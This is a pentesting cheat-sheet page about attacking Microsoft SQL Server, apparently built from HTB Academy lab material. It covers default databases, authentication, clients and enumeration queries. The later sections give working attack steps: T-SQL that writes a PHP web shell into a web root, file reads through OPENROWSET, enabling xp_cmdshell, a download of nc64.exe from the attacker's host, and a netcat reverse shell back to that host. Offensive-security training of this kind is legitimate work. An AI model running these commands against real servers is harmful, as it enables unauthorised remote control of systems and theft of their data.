---
title: msSQL - Microsoft SQL Server
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - database
  - cheat sheet
---

# MSSQL - Microsoft SQL Server

!!! tip "Related resources"
	- [Detailed SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
	- [SQL injection](webexploitation/sql-injection.md)
	- [NoSQL injection](webexploitation/nosql-injection.md)
	- [SQL injections](webexploitation/sqlite-injections.md)

??? example "Languages and dictionaries"
	| Server | Dictionary |
	| -- | -- |
	|  [MySQL](mysql.md) | [MySQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md). | 
	| [MSSQL](mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
	|  [PostgreSQL](5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
	|  [Oracle](1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
	| [SQLite](webexploitation/sqlite-injections.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 

??? example "Attack-based dictionaries"
    - [Generic SQL Injection Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/generic-injections)
    - [Generic Error Based Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based).
    - [Generic Union Select Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select).
    - [SQL time based payloads ](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based).
    - [SQL Injection Auth Bypass Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/auth-bypass) 


Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network. [Wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server).

[By default, MSSQL uses ports `TCP/1433` and `UDP/1434`](1433-mssql.md).  However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.
## MSSQL Databases

MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.

|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|

Table source: [System Databases Microsoft Doc](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15) and HTB Academy

## Authentication Mechanisms

MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:

- Windows authentication mode: This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
- Mixed mode: Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.

##  MSSQL Clients

- [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately
- [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
- [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)|
- [HediSQL](https://www.heidisql.com)
- [SQLPro](https://www.macsqlclient.com)
- [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) To locate it:

```shell-session
locate mssqlclient
```


Of the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install.


## Database configuration

When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.

Authentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system.

Misconfigurations to look at:

- MSSQL clients not using encryption to connect to the MSSQL server.    
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates   
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account.## 

The SA password for SQL Server is the SQL Administrator account built into the program.  The SA password is established during the installation of SQL Server.


## Interact with MSSQL

### From Linux

#### sqsh

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:  [sqsh](sqsh.md)

```bash
sqsh -S $IP -U username -P Password123 -h
# -h: disable headers and footers for a cleaner look.

# When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication.
sqsh -S $ip -U .\\<username> -P 'MyPassword!' -h
# For windows authentication we can use  SERVERNAME\\accountname or .\\accountname
```


#### mssqlclient.py from impacket 

```shell-session
mssqlclient.py -p $port username@$ip 
```


If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
python3 mssqlclient.py Administrator@$ip -windows-auth  
# With python3 mssqlclient.py help you can see more options.
```


### From Windows

[sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility)  |  [Guide](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-use-utility?view=sql-server-ver16)

The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:

- At the command prompt.
- In Query Editor in SQLCMD mode.
- In a Windows script file.
- In an operating system (Cmd.exe) job step of a SQL Server Agent job.

> Careful. In some environments the command GO needs to be in lowercase.

```cmd-session
sqlcmd -S $IP -U username -P Password123
```

### GUI Application

 [mssql-cli](https://github.com/dbcli/mssql-cli), [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), [dbeaver](https://github.com/dbeaver/dbeaver) 

####  SQL Server Management Studio or SSMS 

[Only in windows](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16). Download, install, and connect to database. 

#### dbeaver

dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

```shell-session
# Install dbeaver
sudo dpkg -i dbeaver-<version>.deb

# Run dbeaver
dbeaver &

# Once we have access to the database using a command-line utility or a GUI application, we can use common [Transact-SQL statements](https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) to enumerate databases and tables containing sensitive information such as usernames and passwords.
```

#### mssqlclient.py from impacket 

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell-session
mssqlclient.py -p $port username@$ip 
```


If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
python3 mssqlclient.py Administrator@$ip -windows-auth  
# With python3 mssqlclient.py help you can see more options.
```


## Basic commands

```
# Get Microsoft SQL server version
select @@version;

# Get usernames
select user_name()
go 

# We need to use GO after our query to execute the SQL syntax. 
# List databases
SELECT name FROM master.dbo.sysdatabases
go

# Select a database
USE $dbName
go
## Examples: Select a database master
## USE master

# Check out which one is the current selected database
SELECT DB_NAME()
go

# Show tables
SELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES
go

# Select a database and show content of a specific table.  
USE $dbName
SELECT * FROM $tableName 

# Example: Select all Data from Table "users". The name of the table ("users") was obtained when running the command for showing the tables.
SELECT * FROM users
go

# Get a list of users in the domain
SELECT name FROM master..syslogins
go

# Get a list of users that are sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# And to make sure: 
SELECT is_srvrolemember('sysadmin')
go
# If your user is admin, it will return 1.
```


Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section `Executing cmd shell in a SQL command line`).

### Write files using MSSQL
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```cmd-session
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### Create files using MSSQL

```
# Using MSSQL to Create a File
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

### Read files using MSSQL

```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```


### Executing cmd shell in a SQL command line

Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command **xp_cmdshell**, that will allow us to use the SQL command line as a CLI. 

Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)

**sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:

```msSQL
# To allow advanced options to be changed.   
EXECUTE sp_configure 'show advanced options', 1
go
  
# To update the currently configured value for advanced options.  
RECONFIGURE
go

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
go

# To update the currently configured value for this feature.  
RECONFIGURE
go
```

>Note:  The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account

Now we can use the MSSQL terminal to execute commands:

```msSQL
# Who am i?
xp_cmdshell 'whoami'
go

# This will return the .exe files existing in the current directory
EXEC xp_cmdshell 'dir *.exe'
go

# To print a file
EXECUTE xp_cmdshell 'type c:\Users\sql_svc\Desktop\user.txt
go

# With this (and a "python3 -m http.server 80" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
go

# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a "nc -lnvp 443". When launching the reverse shell, we'll get a powershell terminal in this tab by running:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443";
# You could also upload winPEAS and run it from this powershell command line
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).
